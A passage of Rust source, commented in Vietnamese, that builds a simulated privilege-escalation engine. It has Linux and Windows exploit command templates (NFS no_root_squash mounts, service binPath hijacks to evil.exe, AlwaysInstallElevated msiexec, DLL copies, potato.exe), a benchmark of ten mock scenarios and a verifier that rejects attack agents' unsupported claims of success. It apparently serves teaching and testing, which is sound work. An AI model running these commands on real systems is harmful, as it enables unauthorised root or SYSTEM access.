                command_template: "capsh --print -- '{target}'".to_string(),
                description: "Lợi dụng Linux capability gán cho tệp để vượt kiểm tra quyền."
                    .to_string(),
                preconditions: vec![
                    "Tệp có capability nguy hiểm (cap_setuid, cap_sys_admin...)".to_string(),
                ],
            },
            ExploitTechnique {
                name: "NfsNoRootSquash".to_string(),
                severity: Severity::Critical,
                command_template: "sudo mount -t nfs {target} /mnt/nfs -o noexec,nosuid && sudo -i"
                    .to_string(),
                description: "Gắn bản xuất NFS `no_root_squash` để thừa hưởng quyền root."
                    .to_string(),
                preconditions: vec!["Máy chủ xuất NFS với tùy chọn no_root_squash".to_string()],
            },
            ExploitTechnique {
                name: "WorldWritablePath".to_string(),
                severity: Severity::Medium,
                command_template: "cp /tmp/payload {target}".to_string(),
                description: "Ghi đè tệp cấu hình ghi được bởi mọi người để chèn mã thực thi."
                    .to_string(),
                preconditions: vec!["Tệp đích có quyền ghi cho mọi người".to_string()],
            },
            ExploitTechnique {
                name: "DangerousSymlink".to_string(),
                severity: Severity::Medium,
                command_template: "cat {target}".to_string(),
                description: "Theo liên kết tượng tới tệp cấu hình nhạy cảm.".to_string(),
                preconditions: vec!["Liên kết tượng trỏ tới tệp nhạy cảm tồn tại".to_string()],
            },
            ExploitTechnique {
                name: "TokenImpersonation".to_string(),
                severity: Severity::Critical,
                command_template: "potato.exe".to_string(),
                description: "Mạo danh token đặc quyền thông qua cơ chế ẩn danh của LSA."
                    .to_string(),
                preconditions: vec![
                    "`RestrictAnonymous = 0` hoặc `EveryoneIncludesAnonymous = 1`".to_string(),
                    "Có tài khoản người dùng đang đăng nhập".to_string(),
                ],
            },
            ExploitTechnique {
                name: "UnquotedServicePath".to_string(),
                severity: Severity::High,
                command_template:
                    "sc.exe config {target} binPath= \"C:\\tmp\\evil.exe\" && net start {target}"
                        .to_string(),
                description: "Chèn tệp thực thi vào thư mục tiền tố của đường dẫn dịch vụ."
                    .to_string(),
                preconditions: vec![
                    "ImagePath không đặt trong ngoặc kép và chứa khoảng trắng".to_string(),
                    "Thư mục tiền tố nằm trong tay kẻ tấn công".to_string(),
                ],
            },
            ExploitTechnique {
                name: "WeakServicePermissions".to_string(),
                severity: Severity::High,
                command_template:
                    "sc.exe config {target} binPath= \"C:\\tmp\\evil.exe\" && net start {target}"
                        .to_string(),
                description: "Ghi đè tệp nhị phân của dịch vụ để chạy mã với quyền dịch vụ."
                    .to_string(),
                preconditions: vec![
                    "Tệp nhị phân của dịch vụ ghi được bởi kẻ tấn công".to_string(),
                ],
            },
            ExploitTechnique {
                name: "AlwaysInstallElevated".to_string(),
                severity: Severity::Critical,
                command_template: "msiexec /i {target} /qn".to_string(),
                description: "Cài đặt gói MSI với quyền SYSTEM mà không cần UAC.".to_string(),
                preconditions: vec![
                    "`AlwaysInstallElevated = 1` và `EnableLUA = 0`".to_string(),
                    "Tệp MSI do kẻ tấn công kiểm soát".to_string(),
                ],
            },
            ExploitTechnique {
                name: "DllHijack".to_string(),
                severity: Severity::High,
                command_template: "copy hijacked.dll {target}".to_string(),
                description: "Chiếm quyền thư viện DLL được dịch vụ nạp từ thư mục ghi được."
                    .to_string(),
                preconditions: vec!["Thư mục chứa DLL nằm trong tay kẻ tấn công".to_string()],
            },
            ExploitTechnique {
                name: "CleartextPassword".to_string(),
                severity: Severity::High,
                command_template: "net stop {target} && net start {target}".to_string(),
                description: "Trích xuất mật khẩu bản rõ của dịch vụ rồi khởi động lại dịch vụ."
                    .to_string(),
                preconditions: vec![
                    "Giá trị mật khẩu lưu dạng bản rõ trong sổ đăng ký".to_string(),
                ],
            },
        ];
        Self { techniques }
    }

    /// Sinh kế hoạch khai thác từ danh sách phát hiện.
    ///
    /// Mỗi phát hiện được khớp với đúng một kỹ thuật trong bảng tham chiếu; kế hoạch được
    /// sắp xếp theo mức nghiêm trọng giảm dần.
    pub fn suggest(&self, findings: &[Finding]) -> Vec<ExploitTechnique> {
        let mut out: Vec<ExploitTechnique> = Vec::new();
        for finding in findings {
            let Some(template) = self.techniques.iter().find(|t| t.name == finding.technique)
            else {
                continue;
            };
            let mut technique = template.clone();
            technique
                .preconditions
                .push(format!("Mục tiêu: {}", action_target(finding)));
            if finding.severity > technique.severity {
                technique.severity = finding.severity;
            }
            out.push(technique);
        }
        out.sort_by(|a, b| {
            b.severity
                .cmp(&a.severity)
                .then_with(|| a.name.cmp(&b.name))
        });
        out
    }

    /// Hiển thị lệnh khai thác cụ thể cho một kỹ thuật và một mục tiêu.
    ///
    /// Nếu mẫu lệnh chứa `{target}` thì chỗ đó được thay bằng `target`; nếu không có
    /// placeholder nào, mẫu lệnh được trả về nguyên vẹn.
    pub fn render_command(&self, technique: &ExploitTechnique, target: &str) -> String {
        if technique.command_template.contains("{target}") {
            technique.command_template.replace("{target}", target)
        } else {
            technique.command_template.clone()
        }
    }

    /// Trả về thứ tự ưu tiên (chỉ số vào [`ExploitSuggester::techniques`]) của các kỹ thuật
    /// khớp với danh sách phát hiện.
    ///
    /// Tiêu chí sắp xếp: mức nghiêm trọng giảm dần, rồi số lượng phát hiện khớp giảm dần,
    /// rồi chỉ số tăng dần (tính tất định).
    pub fn priority_order(&self, findings: &[Finding]) -> Vec<usize> {
        let mut scored: Vec<(usize, Severity, usize)> = Vec::new();
        for (index, technique) in self.techniques.iter().enumerate() {
            let count = findings
                .iter()
                .filter(|f| f.technique == technique.name)
                .count();
            if count > 0 {
                scored.push((index, technique.severity, count));
            }
        }
        scored.sort_by(|a, b| {
            b.1.cmp(&a.1)
                .then_with(|| b.2.cmp(&a.2))
                .then_with(|| a.0.cmp(&b.0))
        });
        scored.into_iter().map(|(index, _, _)| index).collect()
    }
}

// ============================================================================
// 10. KIỂM CHỨNG SỰ THẬT NỀN (GROUND-TRUTH VERIFIER)
// ============================================================================

/// Kết quả của một lần kiểm chứng sự thật nền.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VerificationResult {
    /// `true` khi và chỉ khi hệ thống thật trả về đúng người dùng kỳ vọng.
    pub verified: bool,
    /// Bằng chứng thô thu được (thường là đầu ra của lệnh `whoami`).
    pub proof: String,
    /// Phương pháp kiểm chứng đã dùng.
    pub method: String,
    /// Mô tả chi tiết giúp con người hiểu vì sao kết quả là được hay bị từ chối.
    pub details: String,
}

/// Bộ kiểm chứng sự thật nền — **trái tim** của chương này.
///
/// Triết lý lấy từ `hackingBuddyGPT`: tác tử tấn công thường tự khai "tôi đã leo thang
/// thành công" bằng văn bản do chính nó sinh ra. Những lời khai đó **không có giá trị
/// bằng chứng**. Bộ kiểm chứng này chỉ chấp nhận khi lệnh `whoami` thật trên vỏ lệnh mô
/// phỏng trả về đúng người dùng kỳ vọng; nếu không, phát hiện bị đánh dấu là chưa leo
/// thang và kế hoạch bị coi là thất bại.
#[derive(Debug, Clone)]
pub struct GroundTruthVerifier {
    /// Người dùng mà ta **mong đợi** sẽ xuất hiện sau khi leo thang (ví dụ `"root"`).
    pub expected_user: String,
}

impl GroundTruthVerifier {
    /// Tạo bộ kiểm chứng với người dùng kỳ vọng.
    pub fn new(expected_user: &str) -> Self {
        Self {
            expected_user: expected_user.to_string(),
        }
    }

    /// Kiểm chứng trạng thái hiện tại của vỏ lệnh.
    ///
    /// Hàm này **không** tin bất kỳ lời khai nào: nó đọc trực tiếp danh tính mà vỏ lệnh
    /// trả về cho lệnh `whoami` (tương đương đọc trạng thái phiên làm việc sau khi chạy
    /// lệnh), rồi so sánh với [`GroundTruthVerifier::expected_user`].
    pub fn verify(&self, shell: &MockShell) -> VerificationResult {
        let observed = shell.whoami();
        let privileged = shell.is_privileged();
        let details = format!(
            "Truy vấn `whoami` trên vỏ lệnh cho kết quả `{observed}` (đặc quyền = {privileged}); \
             người dùng kỳ vọng là `{}`.",
            self.expected_user
        );
        self.judge(observed, "whoami", details)
    }

    /// Kiểm chứng một chuỗi đầu ra do tác tử tự khai.
    ///
    /// Chỉ khi đầu ra **trùng khớp chính xác** với người dùng kỳ vọng thì mới được coi là
    /// đã leo thang. Mọi câu tự thuật dài hơn (kiểu "Tôi đã leo thang thành công, giờ là
    /// root") đều bị **từ chối**, kể cả khi chúng có chứa đúng chuỗi người dùng.
    pub fn verify_output(&self, output: &str) -> VerificationResult {
        let details = format!(
            "Đầu ra tự báo của tác tử: `{output}`; người dùng kỳ vọng là `{}`. \
             Chỉ đầu ra trùng khớp tuyệt đối mới được coi là bằng chứng.",
            self.expected_user
        );
        self.judge(output, "self-report", details)
    }

    /// Chạy một lệnh thật trên vỏ lệnh rồi kiểm chứng đầu ra của lệnh đó.
    pub fn verify_with_command(&self, shell: &mut MockShell, cmd: &str) -> VerificationResult {
        let output = shell.execute(cmd);
        let details = format!(
            "Lệnh `{cmd}` trả về `{output}`; người dùng kỳ vọng là `{}`.",
            self.expected_user
        );
        self.judge(&output, &format!("exec: {cmd}"), details)
    }

    /// So sánh quan sát được với kỳ vọng và dựng kết quả kiểm chứng.
    fn judge(&self, observed: &str, method: &str, details: String) -> VerificationResult {
        let verified = observed
            .trim()
            .eq_ignore_ascii_case(self.expected_user.trim());
        let proof = observed.trim().to_string();
        VerificationResult {
            verified,
            proof,
            method: method.to_string(),
            details,
        }
    }
}

// ============================================================================
// 11. BỘ ĐO NĂNG LỰC (PRIVESC BENCHMARK) — 10 KỊCH BẢN CHUẨN
// ============================================================================

/// Một kịch bản đo năng lực của động cơ leo thang quyền.
#[derive(Debug, Clone)]
pub struct BenchmarkScenario {
    /// Mã kịch bản (1..=10).
    pub id: u32,
    /// Tên mô tả kịch bản.
    pub name: String,
    /// Nền tảng áp dụng.
    pub platform: Platform,
    /// Hệ thống tệp mô phỏng của kịch bản.
    pub fs: MockFilesystem,
    /// Sổ đăng ký mô phỏng của kịch bản.
    pub registry: MockRegistry,
    /// Kỹ thuật mà động cơ **phải** phát hiện được.
    pub expected_technique: String,
    /// Danh tính đặc quyền mong đợi sau khi khai thác thành công.
    pub expected_root_proof: String,
}

/// Kết quả chạy một kịch bản đo năng lực.
#[derive(Debug, Clone)]
pub struct BenchmarkResult {
    /// Mã kịch bản.
    pub scenario_id: u32,
    /// Tên kịch bản.
    pub scenario_name: String,
    /// Động cơ có phát hiện được ít nhất một vấn đề hay không.
    pub detected: bool,
    /// Động cơ có phát hiện đúng kỹ thuật kỳ vọng hay không.
    pub technique_matched: bool,
    /// Bằng chứng sự thật nền có được cấp hay không (tức leo thang có thật không).
    pub ground_truth_verified: bool,
    /// Điểm số trong khoảng `[0.0, 1.0]`.
    pub score: f64,
    /// Ghi chú giải thích kết quả.
    pub notes: String,
}

/// Bộ benchmark gồm 10 kịch bản leo thang quyền chuẩn.
///
/// Mỗi kịch bản mô tả một tình huống leo thang điển hình (6 Linux + 4 Windows) với dữ
/// liệu tổng hợp tất định. Điểm số được tính theo công thức:
/// $$S = 0.4 \cdot \mathbb{1}[\text{detected}] + 0.3 \cdot \mathbb{1}[\text{technique\_matched}] + 0.3 \cdot \mathbb{1}[\text{ground\_truth\_verified}]$$
#[derive(Debug, Clone)]
pub struct PrivEscBenchmark {
    /// Danh sách kịch bản.
    pub scenarios: Vec<BenchmarkScenario>,
}

impl PrivEscBenchmark {
    /// Tạo bộ benchmark chuẩn gồm 10 kịch bản.
    pub fn standard_suite() -> Self {
        let scenarios = vec![
            BenchmarkScenario {
                id: 1,
                name: "Linux — Nhị phân SUID thuộc bảng GTFOBins".to_string(),
                platform: Platform::Linux,
                fs: {
                    let mut fs = MockFilesystem::new();
                    fs.add_file("/bin/sh", b"ELF", 0o755, "root");
                    fs.add_file("/usr/bin/find", b"ELF", 0o4755, "root");
                    fs.add_file("/etc/passwd", b"root:x:0:0\n", 0o644, "root");
                    fs
                },
                registry: MockRegistry::new(),
                expected_technique: "SuidBinary".to_string(),
                expected_root_proof: LINUX_ROOT_USER.to_string(),
            },
            BenchmarkScenario {
                id: 2,
                name: "Linux — sudoers cấp NOPASSWD cho toàn bộ lệnh".to_string(),
                platform: Platform::Linux,
                fs: {
                    let mut fs = MockFilesystem::new();
                    fs.add_file(
                        "/etc/sudoers",
                        b"root ALL=(ALL:ALL) ALL\ndev ALL=(ALL) NOPASSWD: ALL\n",
                        0o440,
                        "root",
                    );
                    fs
                },
                registry: MockRegistry::new(),
                expected_technique: "SudoMisconfig".to_string(),
                expected_root_proof: LINUX_ROOT_USER.to_string(),
            },
            BenchmarkScenario {
                id: 3,
                name: "Linux — Cron job gọi script ghi được bởi mọi người".to_string(),
                platform: Platform::Linux,
                fs: {
                    let mut fs = MockFilesystem::new();
                    fs.add_file(
                        "/etc/crontab",
                        b"* * * * * root /opt/backup/run.sh\n",
                        0o644,
                        "root",
                    );
                    fs.add_file("/opt/backup/run.sh", b"#!/bin/sh\n", 0o777, ATTACKER_USER);
                    fs
                },
                registry: MockRegistry::new(),
                expected_technique: "CronJob".to_string(),
                expected_root_proof: LINUX_ROOT_USER.to_string(),
            },
            BenchmarkScenario {
                id: 4,
                name: "Linux — Tệp thực thi được gán capability cap_setuid".to_string(),
                platform: Platform::Linux,
                fs: {
                    let mut fs = MockFilesystem::new();
                    fs.add_file("/opt/app/tool", b"ELF", 0o755, "root");
                    fs.add_file(
                        "/opt/app/tool.cap",
                        b"cap_setuid,cap_net_raw=ep",
                        0o644,
                        "root",
                    );
                    fs
                },
                registry: MockRegistry::new(),
                expected_technique: "Capabilities".to_string(),
                expected_root_proof: LINUX_ROOT_USER.to_string(),
            },
            BenchmarkScenario {
                id: 5,
                name: "Linux — Tệp cấu hình nhạy cảm ghi được bởi mọi người".to_string(),
                platform: Platform::Linux,
                fs: {
                    let mut fs = MockFilesystem::new();
                    fs.add_file("/etc/passwd", b"root:x:0:0\n", 0o666, "root");
                    fs
                },
                registry: MockRegistry::new(),
                expected_technique: "WorldWritablePath".to_string(),
                expected_root_proof: LINUX_ROOT_USER.to_string(),
            },
            BenchmarkScenario {
                id: 6,
                name: "Linux — Bản xuất NFS dùng no_root_squash".to_string(),
                platform: Platform::Linux,
                fs: {
                    let mut fs = MockFilesystem::new();
                    fs.add_file(
                        "/etc/exports",
                        b"/mnt/data *(rw,suid,no_root_squash)\n",
                        0o644,
                        "root",
                    );
                    fs
                },
                registry: MockRegistry::new(),
                expected_technique: "NfsNoRootSquash".to_string(),
                expected_root_proof: LINUX_ROOT_USER.to_string(),
            },
            BenchmarkScenario {
                id: 7,
                name: "Windows — Đường dẫn dịch vụ không đặt trong ngoặc kép".to_string(),
                platform: Platform::Windows,
                fs: {
                    let mut fs = MockFilesystem::new();
                    fs.add_file(
                        "C:\\Program Files\\Unquoted\\svc.exe",
                        b"PE",
                        0o755,
                        "SYSTEM",
                    );
                    fs.add_file("C:\\Program\\evil.dll", b"PE", 0o777, "Users");
                    fs
                },
                registry: {
                    let mut reg = MockRegistry::new();
                    reg.set_value(
                        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\UnquotedSvc",
                        "ImagePath",
                        "C:\\Program Files\\Unquoted\\svc.exe",
                    );
                    reg.set_value(
                        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\UnquotedSvc",
                        "Start",
                        "2",
                    );
                    reg
                },
                expected_technique: "UnquotedServicePath".to_string(),
                expected_root_proof: WINDOWS_SYSTEM_USER.to_string(),
            },
            BenchmarkScenario {
                id: 8,
                name: "Windows — AlwaysInstallElevated bật và UAC bị tắt".to_string(),
                platform: Platform::Windows,
                fs: MockFilesystem::new(),
                registry: {
                    let mut reg = MockRegistry::new();
                    let key =
                        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
                    reg.set_value(key, "EnableLUA", "0");
                    reg.set_value(key, "AlwaysInstallElevated", "1");
                    reg
                },
                expected_technique: "AlwaysInstallElevated".to_string(),
                expected_root_proof: WINDOWS_SYSTEM_USER.to_string(),
            },
            BenchmarkScenario {
                id: 9,
                name: "Windows — Dịch vụ nạp DLL nằm trong thư mục ghi được".to_string(),
                platform: Platform::Windows,
                fs: {
                    let mut fs = MockFilesystem::new();
                    fs.add_file("C:\\Windows\\System32\\svchost.exe", b"PE", 0o755, "SYSTEM");
                    fs.add_file("C:\\Program Files\\DllSvc\\svc.dll", b"PE", 0o777, "Users");
                    fs
                },
                registry: {
                    let mut reg = MockRegistry::new();
                    let key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DllSvc";
                    reg.set_value(key, "ImagePath", "C:\\Windows\\System32\\svchost.exe");
                    reg.set_value(key, "ServiceDll", "C:\\Program Files\\DllSvc\\svc.dll");
                    reg.set_value(key, "Start", "2");
                    reg
                },
                expected_technique: "DllHijack".to_string(),
                expected_root_proof: WINDOWS_SYSTEM_USER.to_string(),
            },
            BenchmarkScenario {
                id: 10,
                name: "Windows — LSA cho phép phiên ẩn danh (mạo danh token)".to_string(),
                platform: Platform::Windows,
                fs: MockFilesystem::new(),
                registry: {
                    let mut reg = MockRegistry::new();
                    let key = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa";
                    reg.set_value(key, "RestrictAnonymous", "0");
                    reg
                },
                expected_technique: "TokenImpersonation".to_string(),
                expected_root_proof: WINDOWS_SYSTEM_USER.to_string(),
            },
        ];
        Self { scenarios }
    }

    /// Số lượng kịch bản trong bộ benchmark.
    pub fn scenario_count(&self) -> usize {
        self.scenarios.len()
    }

    /// Chạy một kịch bản và trả về kết quả.
    ///
    /// Quy trình của mỗi kịch bản: quét → lập kế hoạch → chọn đúng kỹ thuật kỳ vọng →
    /// thực thi → **kiểm chứng sự thật nền** bằng `whoami` thật.
    pub fn run_scenario(&self, idx: usize, shell: &mut MockShell) -> BenchmarkResult {
        let Some(scenario) = self.scenarios.get(idx) else {
            return BenchmarkResult {
                scenario_id: 0,
                scenario_name: format!("Kịch bản không tồn tại: {idx}"),
                detected: false,
                technique_matched: false,
                ground_truth_verified: false,
                score: 0.0,
                notes: "Chỉ số nằm ngoài phạm vi bộ kịch bản.".to_string(),
            };
        };

        let findings = match scenario.platform {
            Platform::Windows => {
                let mut checker =
                    WindowsPrivEscChecker::new(scenario.fs.clone(), scenario.registry.clone());
                checker.scan()
            }
            _ => {
                let mut checker = LinuxPrivEscChecker::new(scenario.fs.clone());
                checker.scan()
            }
        };

        let detected = !findings.is_empty();
        let technique_matched = findings
            .iter()
            .any(|f| f.technique == scenario.expected_technique);

        let suggester = ExploitSuggester::new();
        let plan = suggester.suggest(&findings);
        let chosen = plan
            .iter()
            .find(|technique| technique.name == scenario.expected_technique)
            .cloned();

        let mut ground_truth_verified = false;
        let notes = match &chosen {
            Some(technique) => {
                let target = technique
                    .preconditions
                    .iter()
                    .find_map(|p| p.strip_prefix("Mục tiêu: "))
                    .unwrap_or(technique.name.as_str())
                    .to_string();
                let command = suggester.render_command(technique, &target);
                let _ = shell.execute(&command);
                let _ = shell.escalate(&technique.name);
                let verifier = GroundTruthVerifier::new(&scenario.expected_root_proof);
                let verification = verifier.verify_with_command(shell, "whoami");
                ground_truth_verified = verification.verified;
                format!(
                    "Kỹ thuật `{}` được chọn, lệnh `{}`, bằng chứng nền: `{}`.",
                    technique.name, command, verification.proof
                )
            }
            None => format!(
                "Không tìm thấy kỹ thuật `{}` trong kế hoạch sinh ra từ các phát hiện.",
                scenario.expected_technique
            ),
        };

        let score = 0.4 * f64::from(u8::from(detected))
            + 0.3 * f64::from(u8::from(technique_matched))
            + 0.3 * f64::from(u8::from(ground_truth_verified));

        BenchmarkResult {
            scenario_id: scenario.id,
            scenario_name: scenario.name.clone(),
            detected,
            technique_matched,
            ground_truth_verified,
            score,
            notes,
        }
    }

    /// Chạy toàn bộ kịch bản, mỗi kịch bản dùng một vỏ lệnh sạch.
    pub fn run_all(&self) -> Vec<BenchmarkResult> {
        (0..self.scenarios.len())
            .map(|idx| {
                let mut shell = MockShell::new();
                self.run_scenario(idx, &mut shell)
            })
            .collect()
    }

    /// Tính điểm trung bình của một danh sách kết quả.
    pub fn average_score(&self, results: &[BenchmarkResult]) -> f64 {
        if results.is_empty() {
            return 0.0;
        }
        results.iter().map(|r| r.score).sum::<f64>() / results.len() as f64
    }
}

// ============================================================================
// 12. ĐỘNG CƠ ĐIỀU PHỐI (PRIVESC ENGINE)
// ============================================================================

/// Báo cáo tổng hợp của một chu trình leo thang quyền hoàn chỉnh.
#[derive(Debug, Clone)]
pub struct PrivEscReport {
    /// Toàn bộ phát hiện thu được.
    pub findings: Vec<Finding>,
    /// Kế hoạch khai thác đã sinh.
    pub techniques: Vec<ExploitTechnique>,
    /// Kết quả kiểm chứng sự thật nền cho từng kỹ thuật đã thực thi.
    pub verifications: Vec<VerificationResult>,
    /// `true` khi có ít nhất một lần kiểm chứng thành công.
    pub escalated: bool,
}

/// Động cơ điều phối toàn bộ quy trình leo thang quyền.
#[derive(Debug, Clone)]
pub struct PrivEscEngine {
    /// Bộ dò lỗ hổng Linux.
    pub linux: LinuxPrivEscChecker,
    /// Bộ dò lỗ hổng Windows.
    pub windows: WindowsPrivEscChecker,
    /// Bộ gợi ý khai thác.
    pub suggester: ExploitSuggester,
    /// Bộ kiểm chứng sự thật nền.
    pub verifier: GroundTruthVerifier,
}

impl PrivEscEngine {
    /// Tạo động cơ với hệ thống tệp và sổ đăng ký mô phỏng.
    pub fn new(fs: MockFilesystem, registry: MockRegistry) -> Self {
        Self {
            linux: LinuxPrivEscChecker::new(fs.clone()),
            windows: WindowsPrivEscChecker::new(fs, registry),
            suggester: ExploitSuggester::new(),
            verifier: GroundTruthVerifier::new(LINUX_ROOT_USER),
        }
    }

    /// Quét cả hai nền tảng và trả về toàn bộ phát hiện đã sắp xếp.
    pub fn scan(&mut self) -> Vec<Finding> {
        let mut all = self.linux.scan();
        all.extend(self.windows.scan());
        all.sort_by(|a, b| {
            b.severity
                .cmp(&a.severity)
                .then_with(|| a.technique.cmp(&b.technique))
                .then_with(|| a.path.cmp(&b.path))
        });
        all
    }

    /// Lập kế hoạch khai thác từ danh sách phát hiện.
    pub fn plan(&self, findings: &[Finding]) -> Vec<ExploitTechnique> {
        self.suggester.suggest(findings)
    }

    /// Thực thi kế hoạch và kiểm chứng sự thật nền sau từng kỹ thuật.
    ///
    /// Với mỗi kỹ thuật, động cơ: hiển thị lệnh → chạy lệnh trên vỏ lệnh mô phỏng →
    /// mô phỏng hành vi leo thang → **chạy lại `whoami` để kiểm chứng**. Chỉ khi lệnh
    /// `whoami` trả về đúng người dùng kỳ vọng thì kết quả mới là `verified = true`.
    pub fn execute_plan(
        &self,
        plan: &[ExploitTechnique],
        shell: &mut MockShell,
    ) -> Vec<VerificationResult> {
        let mut results = Vec::new();
        for technique in plan {
            let target = technique
                .preconditions
                .iter()
                .find_map(|p| p.strip_prefix("Mục tiêu: "))
                .unwrap_or(technique.name.as_str())
                .to_string();
            let command = self.suggester.render_command(technique, &target);
            let _ = shell.execute(&command);
            let _ = shell.escalate(&technique.name);
            let verification = self.verifier.verify_with_command(shell, "whoami");
            results.push(verification);
        }
        results
    }

    /// Chạy trọn chu trình: quét → lập kế hoạch → thực thi → kiểm chứng.
    pub fn full_cycle(&mut self, shell: &mut MockShell) -> PrivEscReport {
        let findings = self.scan();
        let techniques = self.plan(&findings);
        let verifications = self.execute_plan(&techniques, shell);
        let escalated = verifications.iter().any(|v| v.verified);
        PrivEscReport {
            findings,
            techniques,
            verifications,
            escalated,
        }
    }
}

// ============================================================================
// 13. DỮ LIỆU DEMO TẤT ĐỊNH
// ============================================================================

/// Hệ thống tệp Linux mô phỏng dùng cho phần minh hoạ trong `main()`.
pub fn demo_linux_filesystem() -> MockFilesystem {
    let mut fs = MockFilesystem::new();
    fs.add_dir("/bin", 0o755);
    fs.add_dir("/usr/bin", 0o755);
    fs.add_file("/bin/sh", b"#!/bin/sh\n", 0o755, "root");
    fs.add_file("/usr/bin/find", b"ELF", 0o4755, "root");
    fs.add_file("/usr/bin/vim", b"ELF", 0o4755, "root");
    fs.add_file("/usr/bin/python3", b"ELF", 0o4755, "root");
    fs.add_file(
        "/etc/passwd",
        b"root:x:0:0:root:/root:/bin/bash\n",
        0o644,
        "root",
    );
    fs.add_file("/etc/shadow", b"root:!:19000:0:99999:7:::\n", 0o640, "root");
    fs.add_file(
        "/etc/sudoers",
        b"root ALL=(ALL:ALL) ALL\ndev ALL=(ALL) NOPASSWD: ALL\n",
        0o440,
        "root",
    );
    fs.add_file(
        "/etc/sudoers.d/backup",
        b"dev ALL=(ALL) NOPASSWD: /bin/bash\n",
        0o440,
        "root",
    );
    fs.add_file(
        "/etc/crontab",
        b"*/5 * * * * root /opt/backup/run.sh\n",
        0o644,
        "root",
    );
    fs.add_file(
        "/opt/backup/run.sh",
        b"#!/bin/sh\necho backup\n",
        0o777,
        ATTACKER_USER,
    );
    fs.add_file("/opt/app/tool", b"ELF", 0o755, "root");
    fs.add_file(
        "/opt/app/tool.cap",
        b"cap_setuid,cap_net_raw=ep",
        0o644,
        "root",
    );
    fs.add_file(
        "/etc/exports",
        b"/mnt/data *(rw,suid,no_root_squash)\n",
        0o644,
        "root",
    );
    fs.add_file("/usr/local/bin/helper", b"ELF", 0o777, ATTACKER_USER);
    fs.add_symlink("/tmp/root-shadow", "/etc/shadow");
    fs
}

/// Hệ thống tệp Windows mô phỏng dùng cho phần minh hoạ trong `main()`.
pub fn demo_windows_filesystem() -> MockFilesystem {
    let mut fs = MockFilesystem::new();
    fs.add_file("C:\\Windows\\System32\\svchost.exe", b"PE", 0o755, "SYSTEM");
    fs.add_file(
        "C:\\Program Files\\Unquoted\\svc.exe",
        b"PE",
        0o755,
        "SYSTEM",
    );
    fs.add_file("C:\\Program\\evil.dll", b"PE", 0o777, "Users");
    fs.add_file("C:\\Program Files\\Weak\\svc.exe", b"PE", 0o777, "Users");
    fs.add_file("C:\\Program Files\\DllSvc\\svc.dll", b"PE", 0o777, "Users");
    fs.add_file("C:\\Program Files\\Cred\\svc.exe", b"PE", 0o755, "SYSTEM");
    fs
}

/// Sổ đăng ký Windows mô phỏng dùng cho phần minh hoạ trong `main()`.
pub fn demo_windows_registry() -> MockRegistry {
    let mut registry = MockRegistry::new();

    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\UnquotedSvc",
        "ImagePath",
        "C:\\Program Files\\Unquoted\\svc.exe",
    );
    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\UnquotedSvc",
        "Start",
        "2",
    );

    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WeakPermSvc",
        "ImagePath",
        "C:\\Program Files\\Weak\\svc.exe",
    );
    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WeakPermSvc",
        "Start",
        "2",
    );

    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DllSvc",
        "ImagePath",
        "C:\\Windows\\System32\\svchost.exe",
    );
    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DllSvc",
        "ServiceDll",
        "C:\\Program Files\\DllSvc\\svc.dll",
    );
    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\DllSvc",
        "Start",
        "2",
    );

    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\CredSvc",
        "ImagePath",
        "C:\\Program Files\\Cred\\svc.exe",
    );
    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\CredSvc",
        "Password",
        "P@ssw0rd!2026",
    );
    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\CredSvc",
        "Start",
        "2",
    );

    registry.set_value(
        "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
        "RestrictAnonymous",
        "0",
    );

    let policy = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    registry.set_value(policy, "EnableLUA", "0");
    registry.set_value(policy, "AlwaysInstallElevated", "1");

    registry
}

// ============================================================================
// 14. HÀM MAIN MINH HỌA
// ============================================================================

fn main() {
    println!("=== CHƯƠNG 102: ĐỘNG CƠ LEO THANG ĐẶC QUYỀN (PRIVESC ENGINE) ===");
    println!(
        "    (Linux SUID/Sudo/Cron/Capabilities · Windows Token/Service/DLL · Ground-truth Verification)"
    );

    // ------------------------------------------------------------------
    // 1. Quét Linux
    // ------------------------------------------------------------------
    let mut engine = PrivEscEngine::new(demo_linux_filesystem(), MockRegistry::new());
    let linux_findings = engine.linux.scan();
    println!(
        "\n[1] PHÁT HIỆN TRÊN LINUX ({} phát hiện)",
        linux_findings.len()
    );
    for finding in &linux_findings {
        println!(
            "  - [{:<8}] {:<18} {}",
            finding.severity.label(),
            finding.technique,
            finding.title
        );
        println!("      đường dẫn : {}", finding.path);
        println!("      lệnh      : {}", finding.exploit_command);
    }

    // ------------------------------------------------------------------
    // 2. Quét Windows
    // ------------------------------------------------------------------
    let mut windows_engine = PrivEscEngine::new(demo_windows_filesystem(), demo_windows_registry());
    // Bộ kiểm chứng của phiên Windows kỳ vọng danh tính SYSTEM, không phải root.
    windows_engine.verifier = GroundTruthVerifier::new(WINDOWS_SYSTEM_USER);
    let windows_findings = windows_engine.windows.scan();
    println!(
        "\n[2] PHÁT HIỆN TRÊN WINDOWS ({} phát hiện)",
        windows_findings.len()
    );
    for finding in &windows_findings {
        println!(
            "  - [{:<8}] {:<22} {}",
            finding.severity.label(),
            finding.technique,
            finding.title
        );
        println!("      đường dẫn : {}", finding.path);
        println!("      lệnh      : {}", finding.exploit_command);
    }

    // ------------------------------------------------------------------
    // 3. Lập kế hoạch khai thác
    // ------------------------------------------------------------------
    let linux_plan = engine.plan(&linux_findings);
    let windows_plan = windows_engine.plan(&windows_findings);
    println!(
        "\n[3] KẾ HOẠCH KHAI THÁC (Linux: {} kỹ thuật · Windows: {} kỹ thuật)",
